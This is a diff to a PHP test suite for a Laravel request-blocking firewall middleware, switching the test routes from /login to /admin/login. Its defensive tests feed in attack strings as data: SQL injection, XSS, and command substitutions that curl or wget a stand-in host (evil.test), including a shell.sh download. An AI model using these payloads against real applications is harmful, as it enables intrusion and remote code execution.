@@ -7,7 +7,7 @@ use Illuminate\Http\UploadedFile;
 use Symfony\Component\HttpKernel\Exception\HttpException;
 
 test('passes a clean request through', function () {
-    $request = Request::create('/login', 'GET');
+    $request = Request::create('/admin/login', 'GET');
 
     $response = (new BlockMaliciousRequests)->handle($request, fn ($req) => new Response('ok'));
 
@@ -15,13 +15,13 @@ test('passes a clean request through', function () {
 });
 
 test('blocks a SQL injection payload in the query string', function () {
-    $request = Request::create('/login', 'GET', ['id' => '1 OR 1=1']);
+    $request = Request::create('/admin/login', 'GET', ['id' => '1 OR 1=1']);
 
     (new BlockMaliciousRequests)->handle($request, fn ($req) => new Response('ok'));
 })->throws(HttpException::class);
 
 test('blocks an XSS payload in the request body', function () {
-    $request = Request::create('/login', 'POST', ['comment' => '<script>alert(1)</script>']);
+    $request = Request::create('/admin/login', 'POST', ['comment' => '<script>alert(1)</script>']);
 
     (new BlockMaliciousRequests)->handle($request, fn ($req) => new Response('ok'));
 })->throws(HttpException::class);
@@ -33,19 +33,19 @@ test('blocks a path traversal attempt in the URI', function () {
 })->throws(HttpException::class);
 
 test('blocks a command substitution payload in the request body', function () {
-    $request = Request::create('/login', 'POST', ['note' => 'ok; $(curl http://evil.test/x)']);
+    $request = Request::create('/admin/login', 'POST', ['note' => 'ok; $(curl http://evil.test/x)']);
 
     (new BlockMaliciousRequests)->handle($request, fn ($req) => new Response('ok'));
 })->throws(HttpException::class);
 
 test('blocks a backtick command substitution payload in the request body', function () {
-    $request = Request::create('/login', 'POST', ['note' => 'ok `id`']);
+    $request = Request::create('/admin/login', 'POST', ['note' => 'ok `id`']);
 
     (new BlockMaliciousRequests)->handle($request, fn ($req) => new Response('ok'));
 })->throws(HttpException::class);
 
 test('blocks a bare wget/curl download payload in the request body', function () {
-    $request = Request::create('/login', 'POST', ['note' => 'wget http://evil.test/shell.sh']);
+    $request = Request::create('/admin/login', 'POST', ['note' => 'wget http://evil.test/shell.sh']);
 
     (new BlockMaliciousRequests)->handle($request, fn ($req) => new Response('ok'));
 })->throws(HttpException::class);
@@ -63,7 +63,7 @@ test('skips the check for excluded paths', function () {
 test('allows every request when disabled', function () {
     config(['waf.enabled' => false]);
 
-    $request = Request::create('/login', 'GET', ['id' => '1 OR 1=1']);
+    $request = Request::create('/admin/login', 'GET', ['id' => '1 OR 1=1']);
 
     $response = (new BlockMaliciousRequests)->handle($request, fn ($req) => new Response('ok'));
 
@@ -71,13 +71,13 @@ test('allows every request when disabled', function () {
 });
 
 test('a real request carrying a SQL injection payload is rejected with a 403', function () {
-    $response = $this->get('/login?search='.urlencode('1 UNION SELECT * FROM users'));
+    $response = $this->get('/admin/login?search='.urlencode('1 UNION SELECT * FROM users'));
 
     $response->assertForbidden();
 });
 
 test('the login page still renders normally through the full middleware stack', function () {
-    $response = $this->get('/login');
+    $response = $this->get('/admin/login');
 
     $response->assertOk();
 });
@@ -86,7 +86,7 @@ test('a payload carrying invalid UTF-8 does not disable the body check', functio
     // The subject used to be json_encode($request->all()), which returns false
     // for any invalid UTF-8 byte; the "?: ''" fallback then dropped the whole
     // body from the scan, so one stray byte switched off every input check.
-    $request = Request::create('/login', 'POST', ['q' => "\xB1\xFF 1 UNION SELECT x FROM y"]);
+    $request = Request::create('/admin/login', 'POST', ['q' => "\xB1\xFF 1 UNION SELECT x FROM y"]);
 
     (new BlockMaliciousRequests)->handle($request, fn ($req) => new Response('ok'));
 })->throws(HttpException::class);
@@ -108,14 +108,14 @@ test('the shipped config inspects the user agent and referer headers', function 
 });
 
 test('blocks an attack signature smuggled through an inspected header', function () {
-    $request = Request::create('/login', 'GET');
+    $request = Request::create('/admin/login', 'GET');
     $request->headers->set('User-Agent', 'sqlmap/1.0 union select 1');
 
     (new BlockMaliciousRequests)->handle($request, fn ($req) => new Response('ok'));
 })->throws(HttpException::class);
 
 test('blocks an attack signature smuggled through the referer', function () {
-    $request = Request::create('/login', 'GET');
+    $request = Request::create('/admin/login', 'GET');
     $request->headers->set('Referer', 'https://warehouse.test/?q=<script>alert(1)</script>');
 
     (new BlockMaliciousRequests)->handle($request, fn ($req) => new Response('ok'));
@@ -126,7 +126,7 @@ test('leaves headers outside waf.inspect_headers alone', function () {
     // only produce false positives, so they are deliberately not inspected.
     config(['waf.inspect_headers' => ['user-agent']]);
 
-    $request = Request::create('/login', 'GET');
+    $request = Request::create('/admin/login', 'GET');
     $request->headers->set('X-Custom', 'union select 1');
 
     $response = (new BlockMaliciousRequests)->handle($request, fn ($req) => new Response('ok'));
@@ -152,7 +152,7 @@ test('blocks the request when the regex engine fails instead of treating it as c
     // "no match" would let an attacker turn the check off by making it fail.
     config(['waf.patterns' => ['sql_injection' => ['/union\s+select/iu']]]);
 
-    $request = Request::create('/login', 'GET', ['q' => "\xFF\xFE"]);
+    $request = Request::create('/admin/login', 'GET', ['q' => "\xFF\xFE"]);
 
     (new BlockMaliciousRequests)->handle($request, fn ($req) => new Response('ok'));
 })->throws(HttpException::class);
